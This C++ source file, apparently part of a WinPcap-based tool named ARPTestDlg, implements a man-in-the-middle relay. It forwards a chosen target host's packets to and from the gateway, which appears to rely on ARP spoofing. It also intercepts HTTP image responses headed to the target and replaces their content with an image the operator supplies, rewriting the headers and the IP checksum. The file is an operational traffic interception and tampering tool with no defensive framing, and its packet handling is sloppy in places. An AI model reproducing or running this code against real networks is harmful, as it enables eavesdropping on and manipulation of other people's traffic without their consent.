#include "stdafx.h"
#include "ARPTestDlg.h"
#include "global.h"


pcap_if_t* g_deviceList = NULL;
pcap_if_t* g_adapter = NULL;
int g_selfIp = 0;
BYTE g_selfMac[6] = {};
int g_selfGateway = 0;
BYTE g_gatewayMac[6] = {};

map<int, BYTE[6]> g_host;


BOOL inputIp(LPCSTR src, int& dest)
{
	int ip[4];
	if (sscanf_s(src, "%d.%d.%d.%d", &ip[0], &ip[1], &ip[2], &ip[3]) != 4)
		return FALSE;
	BYTE* bDest = (BYTE*)&dest;
	bDest[0] = ip[0];
	bDest[1] = ip[1];
	bDest[2] = ip[2];
	bDest[3] = ip[3];
	return TRUE;
}


BOOL GetAdapterHandle(pcap_t*& adapter)
{
	if (g_adapter == NULL)
		return FALSE;
	// open adapter
	char errBuf[PCAP_ERRBUF_SIZE];
	if ((adapter = pcap_open_live(g_adapter->name, 65536, 1, 1000, errBuf)) == NULL)
	{
		MessageBox(NULL, "Error in pcap_open_live: " + CString(g_adapter->name) + " is not supported by WinPcap", "", MB_ICONERROR);
		return FALSE;
	}
	return TRUE;
}


void CalcIpCheckSum(BYTE* ptr, int size)
{
	if (size % 2 != 0)
		return;

	*(short*)(ptr + 10) = 0;

	int cksum = 0;
	for (int index = 0; index < size; index += 2)
	{
		cksum += *(ptr + index + 1);
		cksum += *(ptr + index) << 8;
	}

	while (cksum > 0xFFFF)
		cksum = (cksum >> 16) + (cksum & 0xFFFF);
	*(short*)(ptr + 10) = htons(~cksum);
}

UINT AFX_CDECL PacketHandleThread(LPVOID flag)
{
	CARPTestDlg* thiz = (CARPTestDlg*)AfxGetApp()->m_pMainWnd;
	pcap_t* adapter;
	if (!GetAdapterHandle(adapter))
		return 0;

	// get infomation
	int targetIp = (int)thiz->m_hostList.GetItemDataPtr(thiz->m_hostList.GetCurSel());
	BYTE targetMac[6], gatewayMac[6];
	MoveMemory(targetMac, g_host[targetIp], 6);
	MoveMemory(gatewayMac, g_gatewayMac, 6);

	// read image
	BYTE* imageData = NULL;
	int imageDataLen;
	{
		CString imagePath;
		thiz->m_imagePathEdit.GetWindowText(imagePath);
		CFile f;
		if (f.Open(imagePath, CFile::modeRead | CFile::typeBinary))
		{
			imageDataLen = (int)f.GetLength();
			imageData = new BYTE[imageDataLen];
			f.Read(imageData, imageDataLen);
		}
		else
			MessageBox(NULL, "Failed to load the image.", "", MB_OK);
	}

	// start capture
	pcap_pkthdr* header;
	const BYTE* pkt_data;
	int res;
	int send = 0, receive = 0;
	while (*(BOOL*)flag && (res = pcap_next_ex(adapter, &header, &pkt_data)) >= 0)
	{
		if (res == 0) // timeout
			continue;
		if (memcmp(&pkt_data[6], targetMac, 6) == 0 && memcmp(pkt_data, g_selfMac, 6) == 0) // is target packet
		{
			send++;
			CString status;
			status.Format("send %d, receive %d", send, receive);
			thiz->m_statusStatic.SetWindowText(status);

			if (thiz->m_retransmissionCheck.GetCheck())
			{
				BYTE* newData = new BYTE[header->len];
				MoveMemory(newData, gatewayMac, 6); // destination MAC
				MoveMemory(&newData[6], g_selfMac, 6); // source MAC
				MoveMemory(&newData[12], &pkt_data[12], header->len - 12); // data
				pcap_sendpacket(adapter, (u_char*)newData, header->len);
				delete newData;
			}
		}
		else if (memcmp(&pkt_data[6], g_gatewayMac, 6) == 0 && memcmp(pkt_data, g_selfMac, 6) == 0 // is gateway packet
			&& *(short*)&pkt_data[12] == 0x0008 && (pkt_data[14] >> 4) == 4 && *(int*)&pkt_data[30] == targetIp) // to target
		{
			receive++;
			CString status;
			status.Format("send %d, receive %d", send, receive);
			thiz->m_statusStatic.SetWindowText(status);

			if (pkt_data[23] == 6) // TCP
			{
				int ipLength = (pkt_data[14] & 0x0F) * 4;
				int tcpLength = (pkt_data[14 + ipLength + 12] >> 4) * 4;
				if (strncmp((LPCSTR)&pkt_data[14 + ipLength + tcpLength], "HTTP/1.", strlen("HTTP/1.")) != 0) // not HTTP
					goto Retransmission;
				LPCSTR http = (LPCSTR)&pkt_data[14 + ipLength + tcpLength];
				LPCSTR contentType = strstr(http, "Content-Type: image/");
				if (contentType == NULL) // not image
					goto Retransmission;
				if (!thiz->m_replaceImagesCheck.GetCheck() || imageData == NULL) // no replacing
					goto Retransmission;
				
				// replace image
				LPCSTR contentLen = strstr(http, "Content-Length: ") + strlen("Content-Length: ");
				/*int iContentLen;
				sscanf_s(contentLen, "%d", &iContentLen);*/
				int httpHeaderLen = strstr(http, "\r\n\r\n") + strlen("\r\n\r\n") - http;
				int newLen = 14 + ipLength + tcpLength + httpHeaderLen + 20 + imageDataLen;
				BYTE* newData = new BYTE[newLen];

				MoveMemory(newData, targetMac, 6);					// destination MAC
				MoveMemory(&newData[6], g_selfMac, 6);				// source MAC

				BYTE* p1 = newData + 12;
				const BYTE* p2 = pkt_data + 12;
				int len;
				if (contentType < contentLen)
				{
					len = 2 + ipLength + tcpLength + (contentType - http);
					MoveMemory(p1, p2, len);							// data
					p1 += len; p2 += len;

					len = strlen("Content-Type: image/jpeg");
					MoveMemory(p1, "Content-Type: image/jpeg", len);	// content type
					p1 += len; p2 = (BYTE*)strstr((LPCSTR)p2, "\r");

					len = (BYTE*)contentLen - p2;
					MoveMemory(p1, p2, len);							// data
					p1 += len; p2 += len;

					_itoa_s(imageDataLen, (LPSTR)p1, 15, 10);			// content length
					for (; *(LPCSTR)p1 != '\0'; p1++); p2 = (BYTE*)strstr((LPCSTR)p2, "\r");
				}
				else
				{
					len = 2 + ipLength + tcpLength + (contentLen - http);
					MoveMemory(p1, p2, len);							// data
					p1 += len; p2 += len;

					_itoa_s(imageDataLen, (LPSTR)p1, 15, 10);			// content length
					for (; *(LPCSTR)p1 != '\0'; p1++); p2 = (BYTE*)strstr((LPCSTR)p2, "\r");

					len = (BYTE*)contentType - p2;
					MoveMemory(p1, p2, len);							// data
					p1 += len; p2 += len;

					len = strlen("Content-Type: image/jpeg");
					MoveMemory(p1, "Content-Type: image/jpeg", len);	// content type
					p1 += len; p2 = (BYTE*)strstr((LPCSTR)p2, "\r");
				}

				len = (BYTE*)http + httpHeaderLen - p2;
				MoveMemory(p1, p2, len);							// data
				p1 += len; //p2 += len;

				len = imageDataLen;
				MoveMemory(p1, imageData, len);						// content
				p1 += len;

				int totalLen = p1 - newData;
				*(u_short*)&newData[16] = htons(totalLen - 14);				// IP total length
				CalcIpCheckSum(&newData[14], (newData[14] & 0x0F) * 4);		// IP checksum

				int r = pcap_sendpacket(adapter, (u_char*)newData, totalLen);
				TRACE("len = %d r = %d\n", totalLen, r);
				delete newData;
				continue;
			}
			
Retransmission:
			if (thiz->m_retransmissionCheck.GetCheck())
			{
				BYTE* newData = new BYTE[header->len];
				MoveMemory(newData, targetMac, 6); // destination MAC
				MoveMemory(&newData[6], g_selfMac, 6); // source MAC
				MoveMemory(&newData[12], &pkt_data[12], header->len - 12); // data
				pcap_sendpacket(adapter, (u_char*)newData, header->len);
				delete newData;
			}
		}
	}

	// release
	if (imageData != NULL)
		delete imageData;
	pcap_close(adapter);
	return 0;
}
